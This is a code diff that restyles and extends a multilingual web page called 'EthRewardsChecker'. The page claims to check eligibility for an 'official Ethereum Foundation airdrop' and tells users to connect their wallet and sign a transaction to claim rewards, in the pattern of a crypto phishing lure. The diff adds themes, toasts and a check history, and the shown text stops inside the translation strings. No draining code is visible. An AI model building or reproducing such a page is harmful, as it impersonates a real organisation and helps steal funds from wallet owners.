@@ -3,19 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EthRewardsChecker</title>
+    <title>EthRewardsChecker - Enhanced</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        :root {
+            --bg-primary: #ffffff;
+            --bg-secondary: #f7f7f7;
+            --text-primary: #222222;
+            --text-secondary: #6c6c6c;
+            --accent: #627eea;
+            --accent-hover: #454a75;
+            --success: #10b981;
+            --error: #ef4444;
+            --border: #e2e2e2;
+            --shadow: rgba(0,0,0,0.06);
+        }
+        
+        [data-theme="dark"] {
+            --bg-primary: #1a1a1a;
+            --bg-secondary: #2a2a2a;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0a0;
+            --border: #3a3a3a;
+            --shadow: rgba(0,0,0,0.3);
+        }
+        
         body {
             font-family: 'Inter', sans-serif;
-            background: #ffffff;
-            color: #222222;
+            background: var(--bg-primary);
+            color: var(--text-primary);
             line-height: 1.6;
             min-height: 100vh;
             position: relative;
             overflow-x: hidden;
+            transition: background 0.3s, color 0.3s;
         }
+        
+        /* Background animations */
         .eth-background {
             position: fixed;
             top: 0;
@@ -26,41 +52,48 @@
             overflow: hidden;
             pointer-events: none;
         }
+        
         .eth-shape {
             position: absolute;
             opacity: 0.03;
             animation: float 20s infinite ease-in-out;
         }
+        
         .eth-shape:nth-child(1) {
             width: 300px;
             height: 300px;
-            background: linear-gradient(135deg, #627eea, #454a75);
+            background: linear-gradient(135deg, var(--accent), var(--accent-hover));
             border-radius: 50%;
             top: 10%;
             left: -150px;
         }
+        
         .eth-shape:nth-child(2) {
             width: 200px;
             height: 200px;
-            background: linear-gradient(135deg, #454a75, #627eea);
+            background: linear-gradient(135deg, var(--accent-hover), var(--accent));
             border-radius: 50%;
             top: 60%;
             right: -100px;
             animation-delay: 7s;
         }
+        
         .eth-logo {
             position: absolute;
             opacity: 0.04;
             animation: floatRotate 25s infinite ease-in-out;
         }
-        .eth-logo svg { width: 100%; height: 100%; fill: #627eea; }
+        
+        .eth-logo svg { width: 100%; height: 100%; fill: var(--accent); }
         .eth-logo:nth-child(3) { width: 120px; height: 120px; top: 15%; right: 10%; }
         .eth-logo:nth-child(4) { width: 80px; height: 80px; top: 70%; left: 15%; animation-delay: 5s; }
         .eth-logo:nth-child(5) { width: 100px; height: 100px; top: 40%; right: 20%; animation-delay: 10s; }
+        
         @keyframes float {
             0%, 100% { transform: translateY(0px); }
             50% { transform: translateY(-30px); }
         }
+        
         @keyframes floatRotate {
             0% { transform: translateY(0) rotate(0deg); opacity: 0.04; }
             25% { transform: translateY(-40px) rotate(90deg); opacity: 0.06; }
@@ -68,18 +101,68 @@
             75% { transform: translateY(30px) rotate(270deg); opacity: 0.05; }
             100% { transform: translateY(0) rotate(360deg); opacity: 0.04; }
         }
+        
+        /* Toast notifications */
+        .toast-container {
+            position: fixed;
+            top: 24px;
+            right: 24px;
+            z-index: 10001;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .toast {
+            background: white;
+            padding: 16px 20px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            min-width: 300px;
+            animation: slideIn 0.3s ease-out;
+            border-left: 4px solid var(--accent);
+        }
+        
+        [data-theme="dark"] .toast {
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+        }
+        
+        .toast.success { border-left-color: var(--success); }
+        .toast.error { border-left-color: var(--error); }
+        
+        .toast-icon { font-size: 20px; }
+        .toast-message { flex: 1; font-size: 14px; font-weight: 500; }
+        
+        @keyframes slideIn {
+            from { transform: translateX(400px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        /* Cookie banner */
         .cookie-banner {
             position: fixed;
             bottom: 0;
             left: 0;
             right: 0;
-            background: #222222;
-            color: white;
+            background: var(--text-primary);
+            color: var(--bg-primary);
             padding: 20px;
             z-index: 10000;
-            box-shadow: 0 -4px 12px rgba(0,0,0,0.15);
+            box-shadow: 0 -4px 12px var(--shadow);
+            transform: translateY(100%);
+            transition: transform 0.3s ease-out;
         }
+        
+        .cookie-banner.show {
+            transform: translateY(0);
+        }
+        
         .cookie-banner.hidden { display: none; }
+        
         .cookie-content {
             max-width: 1200px;
             margin: 0 auto;
@@ -89,8 +172,10 @@
             gap: 24px;
             flex-wrap: wrap;
         }
+        
         .cookie-text { flex: 1; font-size: 14px; }
         .cookie-buttons { display: flex; gap: 12px; }
+        
         .cookie-btn {
             padding: 10px 24px;
             border-radius: 8px;
@@ -99,18 +184,59 @@
             cursor: pointer;
             transition: 0.2s;
         }
-        .cookie-btn.accept { background: #627eea; color: white; border: none; }
-        .cookie-btn.decline { background: transparent; color: white; border: 1px solid rgba(255,255,255,0.3); }
-        .language-selector { position: fixed; top: 24px; right: 24px; z-index: 100; }
+        
+        .cookie-btn.accept { background: var(--accent); color: white; border: none; }
+        .cookie-btn.accept:hover { background: var(--accent-hover); }
+        .cookie-btn.decline { background: transparent; color: var(--bg-primary); border: 1px solid rgba(255,255,255,0.3); }
+        
+        /* Header controls */
+        .header-controls {
+            position: fixed;
+            top: 24px;
+            right: 24px;
+            z-index: 100;
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+        
+        .theme-toggle {
+            width: 44px;
+            height: 44px;
+            background: var(--bg-primary);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            transition: all 0.2s;
+            box-shadow: 0 2px 8px var(--shadow);
+        }
+        
+        .theme-toggle:hover {
+            transform: scale(1.05);
+            box-shadow: 0 4px 12px var(--shadow);
+        }
+        
         .language-selector select {
-            padding: 8px 14px;
-            background: white;
-            border: 1px solid #e2e2e2;
+            padding: 10px 14px;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            border: 1px solid var(--border);
             border-radius: 8px;
             font-size: 14px;
             cursor: pointer;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            box-shadow: 0 2px 8px var(--shadow);
+            transition: all 0.2s;
         }
+        
+        .language-selector select:hover {
+            box-shadow: 0 4px 12px var(--shadow);
+        }
+        
+        /* Hero section */
         .hero {
             max-width: 1200px;
             margin: 120px auto 80px;
@@ -119,23 +245,44 @@
             position: relative;
             z-index: 1;
         }
+        
         .hero-logo {
             width: 80px;
             height: 80px;
             margin: 0 auto 24px;
             animation: pulse 3s ease-in-out infinite;
         }
+        
         .hero-logo svg {
             width: 100%;
             height: 100%;
             filter: drop-shadow(0 4px 12px rgba(98, 126, 234, 0.3));
         }
+        
         @keyframes pulse {
-            0%, 100% { transform: scale(1); filter: drop-shadow(0 4px 12px rgba(98, 126, 234, 0.3)); }
-            50% { transform: scale(1.05); filter: drop-shadow(0 8px 20px rgba(98, 126, 234, 0.5)); }
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
         }
-        .hero h1 { font-size: 56px; font-weight: 800; margin-bottom: 16px; color: #627eea; }
-        .hero p { font-size: 20px; color: #6c6c6c; max-width: 700px; margin: 0 auto; }
+        
+        .hero h1 {
+            font-size: 56px;
+            font-weight: 800;
+            margin-bottom: 16px;
+            color: var(--accent);
+            background: linear-gradient(135deg, var(--accent), var(--accent-hover));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .hero p {
+            font-size: 20px;
+            color: var(--text-secondary);
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        
+        /* Main container */
         .container {
             max-width: 640px;
             margin: 0 auto 80px;
@@ -143,79 +290,295 @@
             position: relative;
             z-index: 1;
         }
+        
         .card {
-            background: white;
-            border: 1px solid #e2e2e2;
+            background: var(--bg-primary);
+            border: 1px solid var(--border);
             border-radius: 16px;
             padding: 40px;
-            box-shadow: 0 4px 16px rgba(0,0,0,0.06);
+            box-shadow: 0 4px 16px var(--shadow);
+            transition: all 0.3s;
         }
-        label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 600; }
+        
+        /* Form elements */
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 24px;
+        }
+        
         input {
             width: 100%;
-            padding: 14px 16px;
-            background: #f7f7f7;
-            border: 1px solid #e2e2e2;
+            padding: 14px 44px 14px 16px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
             border-radius: 10px;
             font-size: 15px;
             font-family: 'Inter', sans-serif;
-            margin-bottom: 24px;
+            color: var(--text-primary);
+            transition: all 0.2s;
         }
+        
         input:focus {
             outline: none;
-            border-color: #627eea;
-            background: white;
+            border-color: var(--accent);
+            background: var(--bg-primary);
             box-shadow: 0 0 0 3px rgba(98,126,234,0.1);
         }
+        
+        .copy-btn {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 32px;
+            height: 32px;
+            background: transparent;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            transition: all 0.2s;
+            opacity: 0;
+        }
+        
+        .input-wrapper:hover .copy-btn {
+            opacity: 1;
+        }
+        
+        .copy-btn:hover {
+            background: var(--bg-secondary);
+        }
+        
         .btn {
             width: 100%;
             padding: 14px;
-            background: #627eea;
+            background: var(--accent);
             border: none;
             border-radius: 10px;
             color: white;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: 0.2s;
+            transition: all 0.2s;
+            position: relative;
+            overflow: hidden;
         }
-        .btn:hover:not(:disabled) { background: #454a75; transform: translateY(-2px); }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        
+        .btn:hover:not(:disabled) {
+            background: var(--accent-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 16px rgba(98,126,234,0.3);
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .btn-loading {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Skeleton loader */
+        .skeleton {
+            background: linear-gradient(90deg, var(--bg-secondary) 25%, var(--border) 50%, var(--bg-secondary) 75%);
+            background-size: 200% 100%;
+            animation: loading 1.5s infinite;
+            border-radius: 8px;
+        }
+        
+        @keyframes loading {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+        
+        /* Results */
         .result {
             margin-top: 32px;
             padding: 24px;
             border-radius: 12px;
             border: 1px solid;
+            animation: fadeIn 0.3s ease-out;
         }
-        .result.success { background: rgba(16,185,129,0.05); border-color: #10b981; }
-        .result.error { background: rgba(239,68,68,0.05); border-color: #ef4444; }
-        .result-title { font-weight: 700; font-size: 18px; margin-bottom: 12px; }
-        .result.success .result-title { color: #10b981; }
-        .result.error .result-title { color: #ef4444; }
-        .vip-message { color: #10b981; font-weight: 600; margin-bottom: 16px; font-size: 15px; }
-        .stat-box { padding: 20px; background: #f7f7f7; border-radius: 12px; }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .result.success {
+            background: rgba(16,185,129,0.05);
+            border-color: var(--success);
+        }
+        
+        [data-theme="dark"] .result.success {
+            background: rgba(16,185,129,0.1);
+        }
+        
+        .result.error {
+            background: rgba(239,68,68,0.05);
+            border-color: var(--error);
+        }
+        
+        [data-theme="dark"] .result.error {
+            background: rgba(239,68,68,0.1);
+        }
+        
+        .result-title {
+            font-weight: 700;
+            font-size: 18px;
+            margin-bottom: 12px;
+        }
+        
+        .result.success .result-title { color: var(--success); }
+        .result.error .result-title { color: var(--error); }
+        
+        .vip-message {
+            color: var(--success);
+            font-weight: 600;
+            margin-bottom: 16px;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .stat-box {
+            padding: 20px;
+            background: var(--bg-secondary);
+            border-radius: 12px;
+        }
+        
         .stat-label {
             font-size: 12px;
-            color: #6c6c6c;
+            color: var(--text-secondary);
             text-transform: uppercase;
             font-weight: 600;
             margin-bottom: 8px;
             letter-spacing: 0.5px;
         }
-        .stat-value { font-size: 24px; font-weight: 800; margin-bottom: 4px; color: #222222; }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 4px;
+            color: var(--text-primary);
+        }
+        
+        .reward-box {
+            margin-top: 16px;
+            padding: 16px;
+            background: rgba(16,185,129,0.1);
+            border: 2px solid var(--success);
+            border-radius: 10px;
+        }
+        
+        /* History section */
+        .history-section {
+            margin-top: 32px;
+            padding-top: 32px;
+            border-top: 1px solid var(--border);
+        }
+        
+        .history-title {
+            font-size: 14px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: var(--text-secondary);
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .clear-history {
+            font-size: 12px;
+            color: var(--accent);
+            cursor: pointer;
+            text-transform: none;
+            font-weight: 600;
+        }
+        
+        .clear-history:hover {
+            text-decoration: underline;
+        }
+        
+        .history-item {
+            padding: 12px;
+            background: var(--bg-secondary);
+            border-radius: 8px;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .history-item:hover {
+            background: var(--border);
+            transform: translateX(4px);
+        }
+        
+        .history-address {
+            font-size: 13px;
+            font-family: monospace;
+            color: var(--text-primary);
+        }
+        
+        .history-time {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+        
+        /* Footer */
         .footer {
             max-width: 1200px;
             margin: 0 auto;
             padding: 40px 24px;
             text-align: center;
-            color: #6c6c6c;
+            color: var(--text-secondary);
             font-size: 14px;
-            border-top: 1px solid #e2e2e2;
+            border-top: 1px solid var(--border);
             position: relative;
             z-index: 1;
         }
-        .footer a { color: #627eea; text-decoration: none; font-weight: 600; cursor: pointer; }
+        
+        .footer a {
+            color: var(--accent);
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
         .footer a:hover { text-decoration: underline; }
+        
+        /* Modal */
         .modal {
             display: none;
             position: fixed;
@@ -225,10 +588,17 @@
             width: 100%;
             height: 100%;
             background: rgba(0,0,0,0.75);
+            animation: fadeIn 0.2s;
         }
-        .modal.active { display: flex; align-items: center; justify-content: center; }
+        
+        .modal.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
         .modal-content {
-            background: white;
+            background: var(--bg-primary);
             border-radius: 16px;
             width: 90%;
             max-width: 900px;
@@ -236,7 +606,14 @@
             overflow-y: auto;
             padding: 48px;
             position: relative;
+            animation: slideUp 0.3s ease-out;
         }
+        
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
         .close-modal {
             position: absolute;
             top: 24px;
@@ -250,16 +627,49 @@
             justify-content: center;
             border-radius: 8px;
             transition: 0.2s;
+            color: var(--text-primary);
         }
-        .close-modal:hover { background: #f7f7f7; }
-        .modal-content h1 { font-size: 32px; margin-bottom: 24px; font-weight: 800; color: #222222; }
-        .modal-content h2 { font-size: 20px; margin-top: 32px; margin-bottom: 12px; font-weight: 700; color: #222222; }
-        .modal-content p { margin-bottom: 16px; color: #6c6c6c; line-height: 1.7; }
-        .modal-content ul { margin-left: 24px; margin-bottom: 16px; color: #6c6c6c; line-height: 1.7; }
+        
+        .close-modal:hover {
+            background: var(--bg-secondary);
+        }
+        
+        .modal-content h1 {
+            font-size: 32px;
+            margin-bottom: 24px;
+            font-weight: 800;
+            color: var(--text-primary);
+        }
+        
+        .modal-content h2 {
+            font-size: 20px;
+            margin-top: 32px;
+            margin-bottom: 12px;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+        
+        .modal-content p {
+            margin-bottom: 16px;
+            color: var(--text-secondary);
+            line-height: 1.7;
+        }
+        
+        .modal-content ul {
+            margin-left: 24px;
+            margin-bottom: 16px;
+            color: var(--text-secondary);
+            line-height: 1.7;
+        }
+        
+        /* Responsive */
         @media (max-width: 768px) {
             .hero h1 { font-size: 36px; }
             .card { padding: 24px; }
             .modal-content { padding: 32px 24px; }
+            .header-controls { top: 16px; right: 16px; }
+            .toast-container { top: 16px; right: 16px; }
+            .toast { min-width: 250px; }
         }
     </style>
 </head>
@@ -296,6 +706,8 @@
         </div>
     </div>
 
+    <div class="toast-container" id="toastContainer"></div>
+
     <div class="cookie-banner" id="cookieBanner">
         <div class="cookie-content">
             <div class="cookie-text">
@@ -308,25 +720,30 @@
         </div>
     </div>
 
-    <div class="language-selector">
-        <select id="languageSelect">
-            <option value="en">🇬🇧 English</option>
-            <option value="es">🇪🇸 Español</option>
-            <option value="fr">🇫🇷 Français</option>
-            <option value="de">🇩🇪 Deutsch</option>
-            <option value="it">🇮🇹 Italiano</option>
-            <option value="pt">🇵🇹 Português</option>
-            <option value="ru">🇷🇺 Русский</option>
-            <option value="uk">🇺🇦 Українська</option>
-            <option value="zh">🇨🇳 中文</option>
-            <option value="ja">🇯🇵 日本語</option>
-            <option value="ko">🇰🇷 한국어</option>
-            <option value="tr">🇹🇷 Türkçe</option>
-            <option value="pl">🇵🇱 Polski</option>
-            <option value="ar">🇸🇦 العربية</option>
-            <option value="ur">🇵🇰 اردو</option>
-            <option value="hi">🇮🇳 हिन्दी</option>
-        </select>
+    <div class="header-controls">
+        <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+            <span id="themeIcon">🌙</span>
+        </button>
+        <div class="language-selector">
+            <select id="languageSelect" aria-label="Select language">
+                <option value="en">🇬🇧 English</option>
+                <option value="es">🇪🇸 Español</option>
+                <option value="fr">🇫🇷 Français</option>
+                <option value="de">🇩🇪 Deutsch</option>
+                <option value="it">🇮🇹 Italiano</option>
+                <option value="pt">🇵🇹 Português</option>
+                <option value="ru">🇷🇺 Русский</option>
+                <option value="uk">🇺🇦 Українська</option>
+                <option value="zh">🇨🇳 中文</option>
+                <option value="ja">🇯🇵 日本語</option>
+                <option value="ko">🇰🇷 한국어</option>
+                <option value="tr">🇹🇷 Türkçe</option>
+                <option value="pl">🇵🇱 Polski</option>
+                <option value="ar">🇸🇦 العربية</option>
+                <option value="ur">🇵🇰 اردو</option>
+                <option value="hi">🇮🇳 हिन्दी</option>
+            </select>
+        </div>
     </div>
 
     <section class="hero">
@@ -348,12 +765,33 @@
         <div class="card">
             <form id="walletForm">
                 <label for="walletAddress" id="labelAddress">Ethereum Wallet Address</label>
-                <input type="text" id="walletAddress" placeholder="0x..." required>
+                <div class="input-wrapper">
+                    <input 
+                        type="text" 
+                        id="walletAddress" 
+                        placeholder="0x..." 
+                        required
+                        autocomplete="off"
+                        spellcheck="false"
+                        aria-describedby="addressHelp"
+                    >
+                    <button type="button" class="copy-btn" id="copyBtn" aria-label="Copy address" title="Copy address">
+                        📋
+                    </button>
+                </div>
                 <button type="submit" class="btn" id="checkButton">
                     <span id="buttonText">Check Eligibility</span>
                 </button>
             </form>
             <div id="result"></div>
+            
+            <div class="history-section" id="historySection" style="display: none;">
+                <div class="history-title">
+                    <span>📜 Recent Checks</span>
+                    <span class="clear-history" id="clearHistory">Clear</span>
+                </div>
+                <div id="historyList"></div>
+            </div>
         </div>
     </div>
 
@@ -363,11 +801,11 @@
         <a id="termsLink">Terms of Use</a>
     </footer>
 
-    <div id="termsModal" class="modal">
+    <div id="termsModal" class="modal" role="dialog" aria-labelledby="termsTitle" aria-modal="true">
         <div class="modal-content">
-            <div class="close-modal" id="closeModal">×</div>
+            <button class="close-modal" id="closeModal" aria-label="Close modal">×</button>
             
-            <h1>Terms of Use</h1>
+            <h1 id="termsTitle">Terms of Use</h1>
             
             <p><strong>PLEASE READ THESE TERMS OF USE BEFORE USING THE WEBSITE.</strong></p>
 
@@ -451,83 +889,374 @@
     </div>
 
     <script>
+// Enhanced translations with more strings
 const translations = {
-    en: { title: "EthRewardsChecker", subtitle: "Check your wallet eligibility for the official Ethereum Foundation airdrop program", labelAddress: "Ethereum Wallet Address", buttonText: "Check Eligibility", buttonChecking: "Checking...", errorTitle: "Verification Error", invalidAddress: "Invalid wallet address.", connectionError: "Unable to connect. Please try again.", successTitle: "Congratulations!", successContent: "Your wallet meets the requirements.", failTitle: "Not Eligible", failContent: "This wallet does not meet the minimum requirements.", currentBalance: "Current Balance", yourReward: "Your Reward", connectButton: "Connect Wallet", claimInstructions: "Connect your wallet to claim and sign the transaction.", poweredBy: "Powered by Ethereum API", termsLink: "Terms of Use", vipMessage: "You are eligible for a bonus for active use of Ethereum" },
-    es: { title: "EthRewardsChecker", subtitle: "Verifica la elegibilidad de tu billetera", labelAddress: "Dirección de Billetera", buttonText: "Verificar Elegibilidad", buttonChecking: "Verificando...", errorTitle: "Error de Verificación", invalidAddress: "Dirección de billetera inválida.", connectionError: "No se puede conectar.", successTitle: "¡Felicitaciones!", successContent: "Tu billetera cumple los requisitos.", failTitle: "No Elegible", failContent: "Esta billetera no cumple los requisitos.", currentBalance: "Saldo Actual", yourReward: "Tu Recompensa", connectButton: "Conectar Billetera", claimInstructions: "Conecta tu billetera para reclamar y firmar la transacción.", poweredBy: "Powered by Ethereum API", termsLink: "Términos de Uso", vipMessage: "Tienes derecho a un bono por uso activo de Ethereum" },
-    fr: { title: "EthRewardsChecker", subtitle: "Vérifiez l'éligibilité de votre portefeuille", labelAddress: "Adresse du Portefeuille", buttonText: "Vérifier l'Éligibilité", buttonChecking: "Vérification...", errorTitle: "Erreur de Vérification", invalidAddress: "Adresse de portefeuille invalide.", connectionError: "Impossible de se connecter.", successTitle: "Félicitations!", successContent: "Votre portefeuille répond aux exigences.", failTitle: "Non Éligible", failContent: "Ce portefeuille ne répond pas.", currentBalance: "Solde Actuel", yourReward: "Votre Récompense", connectButton: "Connecter le Portefeuille", claimInstructions: "Connectez votre portefeuille pour réclamer et signer la transaction.", poweredBy: "Powered by Ethereum API", termsLink: "Conditions d'Utilisation", vipMessage: "Vous avez droit à un bonus pour utilisation active d'Ethereum" },
-    de: { title: "EthRewardsChecker", subtitle: "Überprüfen Sie die Berechtigung Ihrer Wallet", labelAddress: "Wallet-Adresse", buttonText: "Berechtigung Prüfen", buttonChecking: "Wird geprüft...", errorTitle: "Überprüfungsfehler", invalidAddress: "Ungültige Wallet-Adresse.", connectionError: "Verbindung fehlgeschlagen.", successTitle: "Glückwunsch!", successContent: "Ihre Wallet erfüllt die Anforderungen.", failTitle: "Nicht Berechtigt", failContent: "Diese Wallet erfüllt die Anforderungen nicht.", currentBalance: "Aktueller Kontostand", yourReward: "Ihre Belohnung", connectButton: "Wallet Verbinden", claimInstructions: "Verbinden Sie Ihre Wallet und signieren Sie die Transaktion.", poweredBy: "Powered by Ethereum API", termsLink: "Nutzungsbedingungen", vipMessage: "Sie haben Anspruch auf einen Bonus für die aktive Nutzung von Ethereum" },
-    it: { title: "EthRewardsChecker", subtitle: "Verifica l'idoneità del tuo portafoglio", labelAddress: "Indirizzo del Portafoglio", buttonText: "Verifica Idoneità", buttonChecking: "Verifica in corso...", errorTitle: "Errore di Verifica", invalidAddress: "Indirizzo portafoglio non valido.", connectionError: "Impossibile connettersi.", successTitle: "Congratulazioni!", successContent: "Il tuo portafoglio soddisfa i requisiti.", failTitle: "Non Idoneo", failContent: "Questo portafoglio non soddisfa i requisiti.", currentBalance: "Saldo Attuale", yourReward: "La Tua Ricompensa", connectButton: "Connetti Portafoglio", claimInstructions: "Connetti il tuo portafoglio per richiedere e firmare la transazione.", poweredBy: "Powered by Ethereum API", termsLink: "Termini di Utilizzo", vipMessage: "Hai diritto a un bonus per l'uso attivo di Ethereum" },
-    pt: { title: "EthRewardsChecker", subtitle: "Verifique a elegibilidade da sua carteira", labelAddress: "Endereço da Carteira", buttonText: "Verificar Elegibilidade", buttonChecking: "Verificando...", errorTitle: "Erro de Verificação", invalidAddress: "Endereço de carteira inválido.", connectionError: "Não foi possível conectar.", successTitle: "Parabéns!", successContent: "Sua carteira atende aos requisitos.", failTitle: "Não Elegível", failContent: "Esta carteira não atende aos requisitos.", currentBalance: "Saldo Atual", yourReward: "Sua Recompensa", connectButton: "Conectar Carteira", claimInstructions: "Conecte sua carteira para reivindicar e assinar a transação.", poweredBy: "Powered by Ethereum API", termsLink: "Termos de Uso", vipMessage: "Você tem direito a um bônus por uso ativo do Ethereum" },
-    ru: { title: "EthRewardsChecker", subtitle: "Проверьте кошелек на участие в официальной программе airdrop от Ethereum Foundation", labelAddress: "Адрес Ethereum Кошелька", buttonText: "Проверить Право", buttonChecking: "Проверка...", errorTitle: "Ошибка Проверки", invalidAddress: "Некорректный адрес кошелька.", connectionError: "Не удалось подключиться.", successTitle: "Поздравляем!", successContent: "Ваш кошелек соответствует требованиям.", failTitle: "Не Подходит", failContent: "Этот кошелек не соответствует требованиям.", currentBalance: "Текущий Баланс", yourReward: "Ваше Вознаграждение", connectButton: "Подключить Кошелек", claimInstructions: "Подключите кошелек для получения и подпишите транзакцию.", poweredBy: "Powered by Ethereum API", termsLink: "Условия Использования", vipMessage: "Вам полагается бонус за активное использование Ethereum" },
-    uk: { title: "EthRewardsChecker", subtitle: "Перевірте гаманець на участь в офіційній програмі airdrop від Ethereum Foundation", labelAddress: "Адреса Ethereum Гаманця", buttonText: "Перевірити Право", buttonChecking: "Перевірка...", errorTitle: "Помилка Перевірки", invalidAddress: "Некоректна адреса гаманця.", connectionError: "Не вдалося підключитися.", successTitle: "Вітаємо!", successContent: "Ваш гаманець відповідає вимогам.", failTitle: "Не Підходить", failContent: "Цей гаманець не відповідає вимогам.", currentBalance: "Поточний Баланс", yourReward: "Ваша Винагорода", connectButton: "Підключити Гаманець", claimInstructions: "Підключіть гаманець для отримання та підпишіть транзакцію.", poweredBy: "Powered by Ethereum API", termsLink: "Умови Використання", vipMessage: "Вам належить бонус за активне використання Ethereum" },
-    zh: { title: "EthRewardsChecker", subtitle: "检查您的钱包资格", labelAddress: "以太坊钱包地址", buttonText: "检查资格", buttonChecking: "检查中...", errorTitle: "验证错误", invalidAddress: "钱包地址无效。", connectionError: "无法连接。", successTitle: "恭喜！", successContent: "您的钱包符合要求。", failTitle: "不符合资格", failContent: "此钱包不符合要求。", currentBalance: "当前余额", yourReward: "您的奖励", connectButton: "连接钱包", claimInstructions: "连接您的钱包以领取并签署交易。", poweredBy: "Powered by Ethereum API", termsLink: "使用条款", vipMessage: "您有资格获得活跃使用以太坊的奖金" },
-    ja: { title: "EthRewardsChecker", subtitle: "ウォレットの資格を確認", labelAddress: "イーサリアムウォレットアドレス", buttonText: "資格確認", buttonChecking: "確認中...", errorTitle: "検証エラー", invalidAddress: "ウォレットアドレスが無効です。", connectionError: "接続できませんでした。", successTitle: "おめでとうございます！", successContent: "ウォレットは要件を満たしています。", failTitle: "対象外", failContent: "このウォレットは要件を満たしていません。", currentBalance: "現在の残高", yourReward: "あなたの報酬", connectButton: "ウォレット接続", claimInstructions: "ウォレットを接続して請求し、トランザクションに署名してください。", poweredBy: "Powered by Ethereum API", termsLink: "利用規約", vipMessage: "イーサリアムの積極的な使用に対するボーナスの資格があります" },
-    ko: { title: "EthRewardsChecker", subtitle: "지갑 자격 확인", labelAddress: "이더리움 지갑 주소", buttonText: "자격 확인", buttonChecking: "확인 중...", errorTitle: "검증 오류", invalidAddress: "지갑 주소가 잘못되었습니다.", connectionError: "연결할 수 없습니다.", successTitle: "축하합니다!", successContent: "지갑이 요구 사항을 충족합니다.", failTitle: "자격 없음", failContent: "이 지갑은 요구 사항을 충족하지 않습니다.", currentBalance: "현재 잔액", yourReward: "귀하의 보상", connectButton: "지갑 연결", claimInstructions: "지갑을 연결하여 청구하고 거래에 서명하세요.", poweredBy: "Powered by Ethereum API", termsLink: "이용 약관", vipMessage: "이더리움의 활발한 사용에 대한 보너스를 받을 자격이 있습니다" },
-    tr: { title: "EthRewardsChecker", subtitle: "Cüzdan uygunluğunuzu kontrol edin", labelAddress: "Ethereum Cüzdan Adresi", buttonText: "Uygunluğu Kontrol Et", buttonChecking: "Kontrol ediliyor...", errorTitle: "Doğrulama Hatası", invalidAddress: "Geçersiz cüzdan adresi.", connectionError: "Bağlanılamıyor.", successTitle: "Tebrikler!", successContent: "Cüzdanınız gereksinimleri karşılıyor.", failTitle: "Uygun Değil", failContent: "Bu cüzdan gereksinimleri karşılamıyor.", currentBalance: "Mevcut Bakiye", yourReward: "Ödülünüz", connectButton: "Cüzdan Bağla", claimInstructions: "Talep etmek için cüzdanınızı bağlayın ve işlemi imzalayın.", poweredBy: "Powered by Ethereum API", termsLink: "Kullanım Şartları", vipMessage: "Ethereum'un aktif kullanımı için bonus almaya hak kazandınız" },
